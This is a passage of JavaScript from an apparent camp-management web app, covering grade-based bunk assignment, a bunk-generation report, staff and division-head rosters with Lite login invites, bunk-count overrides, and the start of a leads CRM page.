        if(!el.length){report.warnings.push(n+' could not be placed — every bunk is full.');return;}
        el.sort(function(a,b){return counts[a.name]-counts[b.name];});
        var chosen=el[0];
        d.bunk=chosen.name;d.division=chosen.div;
        counts[chosen.name]++;
    });
}
function autoGenerateBunks(){
    var cfg=bunkGenConfig;
    var allBunksFlat=[];
    Object.entries(structure).forEach(function([div,d]){
        Object.entries(d.grades||{}).forEach(function([gr,g]){
            (g.bunks||[]).forEach(function(b){allBunksFlat.push({name:b,div:div,gr:gr});});
        });
    });
    if(!allBunksFlat.length){toast('Create divisions and bunks first','error');return;}

    var report={requestsTotal:0,requestsHonored:0,avoidViolations:0,placed:0,warnings:[],underMin:[]};

    // Real school grade → the one bunk group configured for it. A camp that
    // never set up school-grade mapping just gets an empty table here, and
    // every bunk group falls back to its old grade-name-only pooling below —
    // fully opt-in, nothing changes for a camp that doesn't use this. Two
    // bunk groups both claiming the same school grade is a camp misconfig
    // (Camp Structure → a grade's "School grade(s)" chips overlap another
    // grade's) — flagged rather than guessed, since guessing wrong here
    // means a kid ends up bunked with the wrong grade.
    var sgToCohort={},sgAmbiguous={};
    Object.keys(structure).forEach(function(div){
        var grades=(structure[div]&&structure[div].grades)||{};
        Object.keys(grades).forEach(function(gr){
            _cohortSchoolGrades(div,gr).forEach(function(sg){
                var key=String(sg||'').trim().toLowerCase();
                if(!key)return;
                if(sgToCohort[key]&&(sgToCohort[key].div!==div||sgToCohort[key].gr!==gr))sgAmbiguous[key]=true;
                else sgToCohort[key]={div:div,gr:gr};
            });
        });
    });
    Object.keys(sgAmbiguous).forEach(function(key){
        delete sgToCohort[key];
        report.warnings.push('"'+key+'" is set as the school grade for more than one bunk group in Camp Structure — campers with that school grade were skipped so no one gets bunked with the wrong grade by mistake. Fix the overlap and re-run.');
    });

    var byGrade={};
    allBunksFlat.forEach(function(b){(byGrade[b.gr]=byGrade[b.gr]||[]).push(b);});

    // Campers with an ambiguously-mapped school grade must never fall
    // through to the grade-blind fallback below — that fallback just
    // headcount-balances across every bunk in the division, which is exactly
    // the "wrong grade" mistake this whole feature exists to prevent. They
    // stay unassigned (the warning above already explains why) instead.
    var ambiguousSkipped={};
    Object.keys(roster).forEach(function(n){
        var c=roster[n];
        if(c.bunk)return;
        var key=String(c.schoolGrade||'').trim().toLowerCase();
        if(key&&sgAmbiguous[key])ambiguousSkipped[n]=true;
    });

    var handled={};
    Object.keys(byGrade).forEach(function(gr){
        var bunksForGrade=byGrade[gr];
        var div=bunksForGrade[0].div;
        var mapped=_cohortSchoolGrades(div,gr).length>0;
        var pool=Object.keys(roster).filter(function(n){
            var c=roster[n];
            if(c.bunk)return false;
            if(mapped){
                var resolved=sgToCohort[String(c.schoolGrade||'').trim().toLowerCase()];
                return resolved&&resolved.div===div&&resolved.gr===gr;
            }
            return c.grade===gr;
        });
        if(!pool.length)return;
        _bunkGenForGrade(pool,bunksForGrade,cfg,report);
        pool.forEach(function(n){if(roster[n].bunk)handled[n]=true;});
    });

    var leftover=Object.keys(roster).filter(function(n){return !roster[n].bunk&&!handled[n]&&!ambiguousSkipped[n];});
    if(leftover.length)_bunkGenFallback(leftover,allBunksFlat,cfg,report);

    report.placed=Object.keys(roster).filter(function(n){return roster[n].bunk;}).length;
    save();
    renderBB();
    _showBunkGenReport(report);
}
function _showBunkGenReport(report){
    var h='<div style="display:flex;flex-direction:column;gap:2px">';
    h+=cvR('Campers placed',String(report.placed));
    if(bunkGenConfig.requestsEnabled!==false)h+=cvR('Friend requests honored',report.requestsHonored+' of '+report.requestsTotal);
    if(bunkGenConfig.doNotBunkEnabled!==false&&report.avoidViolations)h+=cvR('Do-not-bunk conflicts forced','<span class="cv-warn">'+report.avoidViolations+'</span>');
    if(report.underMin.length){
        h+='<div class="cv-sec">Under Minimum Size</div>';
        report.underMin.forEach(function(u){h+=cvR(u.bunk,u.count+' / min '+bunkGenConfig.minBunkSize);});
    }
    if(report.warnings.length){
        h+='<div class="cv-sec">Notes</div>';
        report.warnings.forEach(function(w){h+='<div style="font-size:.8rem;color:var(--s600);padding:3px 0">• '+esc(w)+'</div>';});
    }
    h+='</div>';
    showModal('Bunk Generation Complete',h,null);
}

// ═══ BUNK STAFF — who's taking care of this bunk (Counselor, Junior
// Counselor, Waiter, etc.) ═══════════════════════════════════════════
// Staff are assigned per BUNK (not per camper) — everyone currently placed
// in that bunk shares the same staff list. Kept as its own bunk-name-keyed
// store (bunkStaff), same pattern as bunkManualCounts, rather than folding
// into `structure` (which treats bunks as plain name strings everywhere).
function openBunkStaffModal(bunkName){
    _renderBunkStaffModalBody(bunkName);
}
// A staff record is {name, role, email, phone, smsOptIn}. Email is the join key
// to a Campistry login (camp_users.email) — it is what lets Lite show a
// counselor their own bunk, and what league captains and pickup notifications
// are addressed to. Records without an email still work as a paper roster, but
// nothing can be sent to them, so the UI says so rather than failing silently.
function staffKey(s){ return String((s&&s.email)||'').trim().toLowerCase(); }
// Bunk-staff roles come from the same configured position list hiring uses
// (getStaffFormConfig().positions, customizable in Staff Application Form
// Customizer → Positions) — one role vocabulary end to end, from hiring
// through bunk assignment to Link's per-role suggested tip amounts. Any
// role already saved on this bunk that isn't in the current position list
// (older free-typed data) is appended so editing it doesn't silently
// reassign it to something else.
function _bunkStaffRoleOptions(bunkName){
    var sfc=getStaffFormConfig();
    var positions=(sfc.positions&&sfc.positions.length)?sfc.positions.slice():SFC_POSITIONS_DEFAULT.slice();
    (bunkStaff[bunkName]||[]).forEach(function(s){
        var r=(s.role||'').trim();
        if(r&&positions.indexOf(r)<0)positions.push(r);
    });
    return positions;
}
function _renderBunkStaffModalBody(bunkName){
    var staff=bunkStaff[bunkName]||[];
    var listHtml=staff.length
        ?staff.map(function(s,i){
            var reach=staffKey(s)
                ?'<span style="font-size:.66rem;font-weight:700;color:var(--ok)">Can sign in</span>'
                :'<span style="font-size:.66rem;font-weight:700;color:var(--s400)" title="Without an email this person cannot sign in to Campistry Lite or receive notifications">No login</span>';
            return '<div style="display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--s100)">'
                +'<div style="flex:1;min-width:0">'
                  +'<div style="font-weight:600;font-size:.85rem">'+esc(s.name)+'</div>'
                  +'<div style="font-size:.72rem;color:var(--s400)">'+esc(s.role||'Staff')
                    +(s.email?' · '+esc(s.email):'')+(s.phone?' · '+esc(s.phone):'')+'</div>'
                  +'<div style="margin-top:2px">'+reach+(s.smsOptIn?' <span style="font-size:.66rem;font-weight:700;color:var(--ok)">SMS ok</span>':'')+'</div>'
                +'</div>'
                +(s.email?'<button class="me-btn me-btn--ghost me-btn--sm" title="Send a Campistry Lite invite to this email" onclick="CampistryMe.inviteBunkStaffToLite(\''+je(bunkName)+'\','+i+')">Invite to Lite</button>':'')
                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editBunkStaff(\''+je(bunkName)+'\','+i+')">Edit</button>'
                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.removeBunkStaff(\''+je(bunkName)+'\','+i+')">Remove</button>'
                +'</div>';
        }).join('')
        :'<p style="font-size:.8rem;color:var(--s400);margin:0 0 4px">No staff assigned yet.</p>';
    // Anyone already hired can be dropped in without retyping — hiring has
    // their email, and that is the field that must not be mistyped.
    var hired=hiredStaff().filter(function(a){
        return bunksForStaffEmail(a.email).indexOf(bunkName)<0;
    });
    var hiredPick=hired.length
        ?'<div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--s100)">'
          +'<label class="fl" style="display:block;margin-bottom:4px">Add someone you\'ve hired</label>'
          +'<select class="fs" id="bsHired" onchange="CampistryMe.fillBunkStaffFromHired(this.value)">'
          +'<option value="">— Pick from hired staff —</option>'
          +hired.map(function(a){
              return '<option value="'+esc(a.id)+'">'+esc(a.name||'Unnamed')
                  +((a.positions&&a.positions[0])?' · '+esc(a.positions[0]):'')
                  +(a.email?'':' (no email)')+'</option>';
          }).join('')
          +'</select></div>'
        :'';
    var body=listHtml
        +hiredPick
        +'<div id="bsForm" style="margin-top:14px;padding-top:12px;border-top:1px solid var(--s100)">'
        +'<input type="hidden" id="bsIdx" value="-1">'
        +'<div style="display:flex;gap:8px;margin-bottom:8px">'
        +'<input type="text" id="bsName" placeholder="Name" class="fi" style="flex:1.3">'
        +'<select id="bsRole" class="fs" style="flex:1">'
        +'<option value="">— Role —</option>'
        +_bunkStaffRoleOptions(bunkName).map(function(r){return '<option value="'+esc(r)+'">'+esc(r)+'</option>';}).join('')
        +'</select>'
        +'</div>'
        +'<div style="display:flex;gap:8px;margin-bottom:8px">'
        +'<input type="email" id="bsEmail" placeholder="Email (for their login)" class="fi" style="flex:1.3" autocapitalize="none" spellcheck="false">'
        +'<input type="tel" id="bsPhone" placeholder="Mobile (optional)" class="fi" style="flex:1">'
        +'</div>'
        +'<label style="display:flex;align-items:center;gap:8px;font-size:.76rem;color:var(--s500);margin-bottom:10px">'
        +'<input type="checkbox" id="bsSms"> Okay to text this person</label>'
        +'<div style="display:flex;gap:8px;justify-content:flex-end">'
        +'<button class="me-btn me-btn--ghost me-btn--sm" id="bsCancel" style="display:none" onclick="CampistryMe._resetBunkStaffForm(\''+je(bunkName)+'\')">Cancel</button>'
        +'<button class="me-btn me-btn--pri me-btn--sm" id="bsSave" onclick="CampistryMe.addBunkStaff(\''+je(bunkName)+'\')">Add</button>'
        +'</div>'
        +'<p style="font-size:.72rem;color:var(--s400);margin:10px 0 0">The email is how this person signs in to Campistry Lite and how the office reaches them. Without one they still appear on the roster, but they cannot be sent anything.</p>'
        +'</div>';
    showModal('Staff — '+bunkName,body);
}
function _resetBunkStaffForm(bunkName){ _renderBunkStaffModalBody(bunkName); }
function editBunkStaff(bunkName,idx){
    var s=(bunkStaff[bunkName]||[])[idx]; if(!s)return;
    _renderBunkStaffModalBody(bunkName);
    setTimeout(function(){
        var g=function(id){return document.getElementById(id)};
        if(g('bsIdx'))g('bsIdx').value=String(idx);
        if(g('bsName'))g('bsName').value=s.name||'';
        if(g('bsRole'))g('bsRole').value=s.role||'';
        if(g('bsEmail'))g('bsEmail').value=s.email||'';
        if(g('bsPhone'))g('bsPhone').value=s.phone||'';
        if(g('bsSms'))g('bsSms').checked=!!s.smsOptIn;
        if(g('bsSave'))g('bsSave').textContent='Save';
        if(g('bsCancel'))g('bsCancel').style.display='';
        if(g('bsName'))g('bsName').focus();
    },40);
}
function addBunkStaff(bunkName){
    var g=function(id){return document.getElementById(id)};
    var name=((g('bsName')||{}).value||'').trim(),
        role=((g('bsRole')||{}).value||'').trim(),
        email=((g('bsEmail')||{}).value||'').trim().toLowerCase(),
        phone=((g('bsPhone')||{}).value||'').trim(),
        sms=!!((g('bsSms')||{}).checked),
        idx=parseInt(((g('bsIdx')||{}).value||'-1'),10);
    if(!name){toast('Enter a name','error');return}
    if(email&&!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){toast('That email doesn’t look right','error');return}
    if(!bunkStaff[bunkName])bunkStaff[bunkName]=[];
    // One login per person per bunk: re-adding the same email edits that record
    // rather than creating a duplicate the notifications would then double-send.
    if(email){
        var clash=bunkStaff[bunkName].findIndex(function(s,i){return i!==idx&&staffKey(s)===email});
        if(clash>=0){toast('Someone with that email is already on this bunk','error');return}
    }
    var rec={name:name,role:role||'Staff',email:email,phone:phone,smsOptIn:sms};
    if(idx>=0&&bunkStaff[bunkName][idx])bunkStaff[bunkName][idx]=rec;
    else bunkStaff[bunkName].push(rec);
    save();
    _syncInvitesForBunk(bunkName);
    renderBB();
    _renderBunkStaffModalBody(bunkName);
    toast((idx>=0?'Saved ':'Added ')+name);
}
// ── Staff directory lookups ───────────────────────────────────────────
// Everything downstream (league captains, Lite's counselor view, pickup
// notifications) needs the same answer to "who works with this bunk", so it
// gets asked here rather than each app re-deriving it from bunkStaff.
function getStaffForBunk(bunkName){
    return (bunkStaff[bunkName]||[]).map(function(s){
        return {name:s.name,role:s.role||'Staff',email:staffKey(s),phone:s.phone||'',
                smsOptIn:!!s.smsOptIn,bunk:bunkName};
    });
}
function getStaffForBunks(bunks){
    var seen={},out=[];
    (bunks||[]).forEach(function(b){
        getStaffForBunk(b).forEach(function(s){
            // Someone on two bunks is one person. Key on their login where they
            // have one; fall back to name+role so paper-only staff still merge.
            var k=s.email||(s.name+'|'+s.role).toLowerCase();
            if(seen[k]){ if(seen[k].bunks.indexOf(b)<0)seen[k].bunks.push(b); return; }
            seen[k]=Object.assign({},s,{bunks:[b]});
            out.push(seen[k]);
        });
    });
    return out;
}
// Divisions in Me are grades inside a parent division; a league's "divisions"
// may name either, so accept both and fall back to app1's flat division map.
function getBunksForDivision(divName){
    var out=[];
    Object.keys(structure||{}).forEach(function(parent){
        var s=structure[parent]||{},grades=s.grades||{};
        if(parent===divName){
            Object.keys(grades).forEach(function(g){out=out.concat(grades[g].bunks||[])});
            return;
        }
        if(grades[divName])out=out.concat(grades[divName].bunks||[]);
    });
    if(!out.length){
        try{
            var d=(window.divisions||window.getGlobalDivisions&&window.getGlobalDivisions()||{})[divName];
            if(d&&d.bunks)out=d.bunks.slice();
        }catch(e){}
    }
    return out.filter(function(b,i,a){return b&&a.indexOf(b)===i});
}
function getStaffForDivision(divName){ return getStaffForBunks(getBunksForDivision(divName)); }
function getAllStaff(){ return getStaffForBunks(Object.keys(bunkStaff||{})); }
function findStaffByEmail(email){
    var k=String(email||'').trim().toLowerCase();
    if(!k)return null;
    return getAllStaff().filter(function(s){return s.email===k})[0]||null;
}
// ── Staffing → bunk directory bridge ──────────────────────────────────
// Hiring already collected the name, email and phone. Retyping them to put
// someone on a bunk is both a waste and a chance to mistype the email, which
// is the join key to their login — get that wrong and they can't sign in to
// Lite and never receive a notification.
function hiredStaff(){
    return Object.keys(staffApplications||{})
        .map(function(id){ return Object.assign({id:id},staffApplications[id]||{}); })
        .filter(function(a){ return a.status==='hired'; })
        .sort(function(a,b){ return String(a.name||'').localeCompare(String(b.name||'')); });
}
function allBunkNames(){
    var out=[];
    Object.keys(structure||{}).forEach(function(parent){
        var grades=(structure[parent]||{}).grades||{};
        Object.keys(grades).forEach(function(g){ out=out.concat(grades[g].bunks||[]); });
    });
    return out.filter(function(b,i,a){ return b&&a.indexOf(b)===i; });
}
// Which bunks this person is already on — so hiring can show it, and so we
// never add the same person to the same bunk twice.
function bunksForStaffEmail(email){
    var k=String(email||'').trim().toLowerCase();
    if(!k)return [];
    return Object.keys(bunkStaff||{}).filter(function(b){
        return (bunkStaff[b]||[]).some(function(s){ return staffKey(s)===k; });
    });
}
function assignHiredToBunk(appId,bunkName){
    var a=staffApplications[appId];
    if(!a||!bunkName)return;
    var email=String(a.email||'').trim().toLowerCase();
    if(!bunkStaff[bunkName])bunkStaff[bunkName]=[];
    if(email&&bunkStaff[bunkName].some(function(s){return staffKey(s)===email})){
        toast(a.name+' is already on '+bunkName,'error');
        return;
    }
    bunkStaff[bunkName].push({
        name:a.name||[a.first,a.last].filter(Boolean).join(' '),
        role:(a.positions&&a.positions[0])||'Counselor',
        email:email, phone:a.phone||'', smsOptIn:false,
        smsEmailConsent:!!a.smsEmailConsent // the applicant's OWN consent from their form — distinct from smsOptIn (an admin-asserted flag for the separate manual Lite blast feature)
    });
    save();
    _syncInvitesForBunk(bunkName);
    renderBB();
    viewStaffApp(appId);
    _refreshPplIfActive();
    toast('Added to '+bunkName);
}
function unassignHiredFromBunk(appId,bunkName){
    var a=staffApplications[appId]; if(!a)return;
    var k=String(a.email||'').trim().toLowerCase(); if(!k)return;
    bunkStaff[bunkName]=(bunkStaff[bunkName]||[]).filter(function(s){return staffKey(s)!==k});
    if(!bunkStaff[bunkName].length)delete bunkStaff[bunkName];
    save();
    _syncInvitesForBunk(bunkName);
    renderBB();
    viewStaffApp(appId);
    _refreshPplIfActive();
    toast('Removed from '+bunkName);
}
// Prefill the bunk-staff form from a hired applicant rather than making the
// user retype what hiring already knows.
function fillBunkStaffFromHired(appId){
    var a=staffApplications[appId]; if(!a)return;
    var g=function(id){return document.getElementById(id)};
    if(g('bsName'))g('bsName').value=a.name||[a.first,a.last].filter(Boolean).join(' ');
    if(g('bsRole'))g('bsRole').value=(a.positions&&a.positions[0])||'Counselor';
    if(g('bsEmail'))g('bsEmail').value=a.email||'';
    if(g('bsPhone'))g('bsPhone').value=a.phone||'';
    if(g('bsName'))g('bsName').focus();
}
// Invites this bunk-staff record's email to Campistry Lite as a counselor —
// creates the camp_users row (AccessControl.inviteTeamMember) that
// campistry_lite_login.html's "Create account" flow needs to have something
// to claim. Idempotent: inviteTeamMember already no-ops on a duplicate
// email+camp, so it's safe to click again for someone already invited.
// Deliberately hardcoded to 'counselor' — this button lives on the bunk
// roster, which is where counselors live; a role that needs more access
// (admin/scheduler) still goes through Team management as before.
async function inviteBunkStaffToLite(bunkName,idx){
    var s=bunkStaff[bunkName]&&bunkStaff[bunkName][idx];
    if(!s)return;
    var email=String(s.email||'').trim();
    if(!email){toast('Add an email for '+(s.name||'this person')+' first','error');return;}
    if(!window.AccessControl||!window.AccessControl.inviteTeamMember){
        toast('Invites aren\'t available right now — try again in a moment','error');return;
    }
    toast('Inviting '+(s.name||email)+'…','info');
    try{
        var result=await window.AccessControl.inviteTeamMember(email,'counselor',[],s.name||'');
        if(result&&result.error){toast(result.error,'error');return;}
        if(!result||!result.inviteUrl){toast('Could not create the invite','error');return;}

        // Best-effort email via the same edge function Team management uses —
        // if it fails, the copy-link fallback below still gets them in.
        try{
            var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
            var sess=client&&client.auth?(await client.auth.getSession()):null;
            var token=sess&&sess.data&&sess.data.session&&sess.data.session.access_token;
            var supaUrl=(client&&client.supabaseUrl)||(window.__CAMPISTRY_SUPABASE__&&window.__CAMPISTRY_SUPABASE__.url);
            if(token&&supaUrl){
                await fetch(supaUrl+'/functions/v1/send-invite-email',{
                    method:'POST',
                    headers:{'Content-Type':'application/json','Authorization':'Bearer '+token},
                    body:JSON.stringify({to:email,inviteUrl:result.inviteUrl,role:'Counselor',campName:(window.AccessControl.getCampName&&window.AccessControl.getCampName())||'Your Camp'})
                });
            }
        }catch(mailErr){console.warn('[Me] send-invite-email failed:',mailErr);}

        try{navigator.clipboard&&navigator.clipboard.writeText(result.inviteUrl);}catch(_){}
        toast('Invited '+(s.name||email)+' — link copied, and emailed if that worked');
    }catch(err){
        toast(err.message||'Could not invite '+(s.name||email),'error');
    }
}
function removeBunkStaff(bunkName,idx){
    if(!bunkStaff[bunkName]||!bunkStaff[bunkName][idx])return;
    bunkStaff[bunkName].splice(idx,1);
    save();
    _syncInvitesForBunk(bunkName);
    renderBB();
    _renderBunkStaffModalBody(bunkName);
}
// ── Division Heads ──────────────────────────────────────────────────
// Same shape and the same join-key convention as bunkStaff (see staffKey()
// above) — a record is {name,role,email,phone,smsOptIn}, keyed by division
// (or grade, checked as a fallback the same way leagues/pickup-notification
// resolution already accepts either). This is the "who to notify" mapping
// for a division: pickup-alert routing reads campistryMe.divisionHeads the
// same way it reads bunkStaff.
function divisionsForStaffEmail(email){
    var k=String(email||'').trim().toLowerCase();
    if(!k)return [];
    return Object.keys(divisionHeads||{}).filter(function(d){
        return (divisionHeads[d]||[]).some(function(s){ return staffKey(s)===k; });
    });
}
function openDivisionHeadModal(divName){
    _renderDivisionHeadModalBody(divName);
}
function _renderDivisionHeadModalBody(divName){
    var staff=divisionHeads[divName]||[];
    var listHtml=staff.length
        ?staff.map(function(s,i){
            var reach=staffKey(s)
                ?'<span style="font-size:.66rem;font-weight:700;color:var(--ok)">Can sign in</span>'
                :'<span style="font-size:.66rem;font-weight:700;color:var(--s400)" title="Without an email this person cannot sign in to Campistry Lite or receive notifications">No login</span>';
            return '<div style="display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--s100)">'
                +'<div style="flex:1;min-width:0">'
                  +'<div style="font-weight:600;font-size:.85rem">'+esc(s.name)+'</div>'
                  +'<div style="font-size:.72rem;color:var(--s400)">'+esc(s.role||'Division Head')
                    +(s.email?' · '+esc(s.email):'')+(s.phone?' · '+esc(s.phone):'')+'</div>'
                  +'<div style="margin-top:2px">'+reach+'</div>'
                +'</div>'
                +(s.email?'<button class="me-btn me-btn--ghost me-btn--sm" title="Send a Campistry Lite invite to this email" onclick="CampistryMe.inviteDivisionHeadToLite(\''+je(divName)+'\','+i+')">Invite to Lite</button>':'')
                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editDivisionHead(\''+je(divName)+'\','+i+')">Edit</button>'
                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.removeDivisionHead(\''+je(divName)+'\','+i+')">Remove</button>'
                +'</div>';
        }).join('')
        :'<p style="font-size:.8rem;color:var(--s400);margin:0 0 4px">No division head assigned yet.</p>';
    // Anyone already hired can be dropped in without retyping, same
    // convenience as the bunk-staff picker.
    var hired=hiredStaff().filter(function(a){
        return divisionsForStaffEmail(a.email).indexOf(divName)<0;
    });
    var hiredPick=hired.length
        ?'<div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--s100)">'
          +'<label class="fl" style="display:block;margin-bottom:4px">Add someone you\'ve hired</label>'
          +'<select class="fs" id="dhHired" onchange="CampistryMe.fillDivisionHeadFromHired(this.value)">'
          +'<option value="">— Pick from hired staff —</option>'
          +hired.map(function(a){
              return '<option value="'+esc(a.id)+'">'+esc(a.name||'Unnamed')
                  +((a.positions&&a.positions[0])?' · '+esc(a.positions[0]):'')
                  +(a.email?'':' (no email)')+'</option>';
          }).join('')
          +'</select></div>'
        :'';
    var body=listHtml
        +hiredPick
        +'<div id="dhForm" style="margin-top:14px;padding-top:12px;border-top:1px solid var(--s100)">'
        +'<input type="hidden" id="dhIdx" value="-1">'
        +'<div style="display:flex;gap:8px;margin-bottom:8px">'
        +'<input type="text" id="dhName" placeholder="Name" class="fi" style="flex:1.3">'
        +'<input type="email" id="dhEmail" placeholder="Email (for their login)" class="fi" style="flex:1" autocapitalize="none" spellcheck="false">'
        +'</div>'
        +'<div style="display:flex;gap:8px;margin-bottom:8px">'
        +'<input type="tel" id="dhPhone" placeholder="Mobile (optional)" class="fi" style="flex:1">'
        +'</div>'
        +'<div style="display:flex;gap:8px;justify-content:flex-end">'
        +'<button class="me-btn me-btn--ghost me-btn--sm" id="dhCancel" style="display:none" onclick="CampistryMe._resetDivisionHeadForm(\''+je(divName)+'\')">Cancel</button>'
        +'<button class="me-btn me-btn--pri me-btn--sm" id="dhSave" onclick="CampistryMe.addDivisionHead(\''+je(divName)+'\')">Add</button>'
        +'</div>'
        +'<p style="font-size:.72rem;color:var(--s400);margin:10px 0 0">The email is how this person signs in to Campistry Lite and how pickup alerts and other notifications reach them. Without one they still appear here, but they cannot be sent anything.</p>'
        +'</div>';
    showModal('Division Head — '+divName,body);
}
function _resetDivisionHeadForm(divName){ _renderDivisionHeadModalBody(divName); }
function editDivisionHead(divName,idx){
    var s=(divisionHeads[divName]||[])[idx]; if(!s)return;
    _renderDivisionHeadModalBody(divName);
    setTimeout(function(){
        var g=function(id){return document.getElementById(id)};
        if(g('dhIdx'))g('dhIdx').value=String(idx);
        if(g('dhName'))g('dhName').value=s.name||'';
        if(g('dhEmail'))g('dhEmail').value=s.email||'';
        if(g('dhPhone'))g('dhPhone').value=s.phone||'';
        if(g('dhSave'))g('dhSave').textContent='Save';
        if(g('dhCancel'))g('dhCancel').style.display='';
        if(g('dhName'))g('dhName').focus();
    },40);
}
function fillDivisionHeadFromHired(appId){
    var a=staffApplications[appId]; if(!a)return;
    var g=function(id){return document.getElementById(id)};
    if(g('dhName'))g('dhName').value=a.name||[a.first,a.last].filter(Boolean).join(' ');
    if(g('dhEmail'))g('dhEmail').value=a.email||'';
    if(g('dhPhone'))g('dhPhone').value=a.phone||'';
    if(g('dhName'))g('dhName').focus();
}
function addDivisionHead(divName){
    var g=function(id){return document.getElementById(id)};
    var name=((g('dhName')||{}).value||'').trim(),
        email=((g('dhEmail')||{}).value||'').trim().toLowerCase(),
        phone=((g('dhPhone')||{}).value||'').trim(),
        idx=parseInt(((g('dhIdx')||{}).value||'-1'),10);
    if(!name){toast('Enter a name','error');return}
    if(email&&!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){toast('That email doesn’t look right','error');return}
    if(!divisionHeads[divName])divisionHeads[divName]=[];
    if(email){
        var clash=divisionHeads[divName].findIndex(function(s,i){return i!==idx&&staffKey(s)===email});
        if(clash>=0){toast('Someone with that email is already a head of this division','error');return}
    }
    var rec={name:name,role:'Division Head',email:email,phone:phone};
    if(idx>=0&&divisionHeads[divName][idx])divisionHeads[divName][idx]=rec;
    else divisionHeads[divName].push(rec);
    save();
    renderStructure();
    _renderDivisionHeadModalBody(divName);
    toast((idx>=0?'Saved ':'Added ')+name);
}
function removeDivisionHead(divName,idx){
    if(!divisionHeads[divName]||!divisionHeads[divName][idx])return;
    divisionHeads[divName].splice(idx,1);
    save();
    renderStructure();
    _renderDivisionHeadModalBody(divName);
}
// Mirrors inviteBunkStaffToLite exactly — same 'counselor' role rationale:
// a Division Head's personal alerts arrive through the same Lite alert
// stack as bunk counselors (see PICKUP-ALERTS plan), so their login is the
// same counselor-role account, just also resolved via divisionHeads at
// notify time. A head who also needs broader access still goes through
// Team management, same caveat as inviteBunkStaffToLite.
async function inviteDivisionHeadToLite(divName,idx){
    var s=divisionHeads[divName]&&divisionHeads[divName][idx];
    if(!s)return;
    var email=String(s.email||'').trim();
    if(!email){toast('Add an email for '+(s.name||'this person')+' first','error');return;}
    if(!window.AccessControl||!window.AccessControl.inviteTeamMember){
        toast('Invites aren\'t available right now — try again in a moment','error');return;
    }
    toast('Inviting '+(s.name||email)+'…','info');
    try{
        var result=await window.AccessControl.inviteTeamMember(email,'counselor',[],s.name||'');
        if(result&&result.error){toast(result.error,'error');return;}
        if(!result||!result.inviteUrl){toast('Could not create the invite','error');return;}
        try{
            var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
            var sess=client&&client.auth?(await client.auth.getSession()):null;
            var token=sess&&sess.data&&sess.data.session&&sess.data.session.access_token;
            var supaUrl=(client&&client.supabaseUrl)||(window.__CAMPISTRY_SUPABASE__&&window.__CAMPISTRY_SUPABASE__.url);
            if(token&&supaUrl){
                await fetch(supaUrl+'/functions/v1/send-invite-email',{
                    method:'POST',
                    headers:{'Content-Type':'application/json','Authorization':'Bearer '+token},
                    body:JSON.stringify({to:email,inviteUrl:result.inviteUrl,role:'Counselor',campName:(window.AccessControl.getCampName&&window.AccessControl.getCampName())||'Your Camp'})
                });
            }
        }catch(mailErr){console.warn('[Me] send-invite-email failed:',mailErr);}
        try{navigator.clipboard&&navigator.clipboard.writeText(result.inviteUrl);}catch(_){}
        toast('Invited '+(s.name||email)+' — link copied, and emailed if that worked');
    }catch(err){
        toast(err.message||'Could not invite '+(s.name||email),'error');
    }
}
function openBunkCountModal(bunkName){
    var rosterCt=Object.values(roster).filter(function(c){return c.bunk===bunkName}).length;
    var manualCt=bunkManualCounts[bunkName];
    var isOverride=(manualCt!=null);
    var inputVal=isOverride?manualCt:(rosterCt||0);
    var rosterNote=rosterCt
        ?'<p style="margin:0 0 10px;font-size:.78rem;color:var(--s500)">Imported roster: <strong>'+rosterCt+'</strong> kid'+(rosterCt!==1?'s':'')+'. Setting a number here overrides the roster count for scheduling.</p>'
        :'<p style="margin:0 0 10px;font-size:.78rem;color:var(--s400)">No campers imported for this bunk yet.</p>';
    var clearBtn=isOverride
        ?'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe._clearBunkCount(\''+je(bunkName)+'\');CampistryMe.closeModal(\'dynModal\');" style="margin-right:auto">Clear override</button>'
        :'';
    var body=rosterNote
        +'<input type="number" id="bunkCtInput" min="0" max="999" value="'+inputVal+'" style="width:100%;font-size:1.4rem;padding:10px 14px;border:1.5px solid var(--s200);border-radius:var(--r);text-align:center;box-sizing:border-box">';
    showModal('Kids in '+bunkName,body,function(){
        var val=parseInt((document.getElementById('bunkCtInput')||{}).value||'0',10);
        setBunkCount(bunkName,val);
        closeModal('dynModal');
        render(curPage);
        toast('Set to '+Math.max(0,val)+' kids');
    });
    // Inject clear button into footer
    setTimeout(function(){
        var ft=document.querySelector('#dynModal [id="dynModalSave"]');
        if(ft&&clearBtn){var tmp=document.createElement('span');tmp.innerHTML=clearBtn;ft.parentNode.insertBefore(tmp.firstElementChild,ft.parentNode.firstChild);}
        var inp=document.getElementById('bunkCtInput');if(inp){inp.focus();inp.select();}
    },60);
}

// ── BILLING / BROADCASTS / SOON ──────────────────────────────────
// ── REGISTRATION & ENROLLMENT ─────────────────────────────────────
// ═══════════════════════════════════════════════════════════════
// LEADS / INQUIRY CRM — prospective families before they apply.
// Families inquire at campistry_inquiry.html → campistryMe.leads; the office
// works them through New → Contacted → Tour → Applied → Enrolled (or Lost),
// logging follow-ups and next-contact dates. This is the top of the funnel that
// feeds Registration.
// ═══════════════════════════════════════════════════════════════
var LEAD_STAGES=[
    {key:'all',label:'All',color:'var(--s700)'},
    {key:'new',label:'New',color:'#3B82F6'},
    {key:'contacted',label:'Contacted',color:'#8B5CF6'},
    {key:'tour',label:'Tour',color:'var(--me)'},
    {key:'applied',label:'Applied',color:'#0EA5E9'},
    {key:'enrolled',label:'Enrolled',color:'var(--ok)'},
    {key:'lost',label:'Lost',color:'var(--err)'}
];
function _leadType(s){return s==='enrolled'?'ok':s==='lost'?'err':s==='applied'?'info':s==='tour'?'warn':'gray';}
function _leadLabel(s){var x=LEAD_STAGES.find(function(g){return g.key===s;});return x?x.label:(s||'New');}

function renderLeads(){
    var c=document.getElementById('page-leads');
    var arr=Object.entries(leads);
    var total=arr.length;
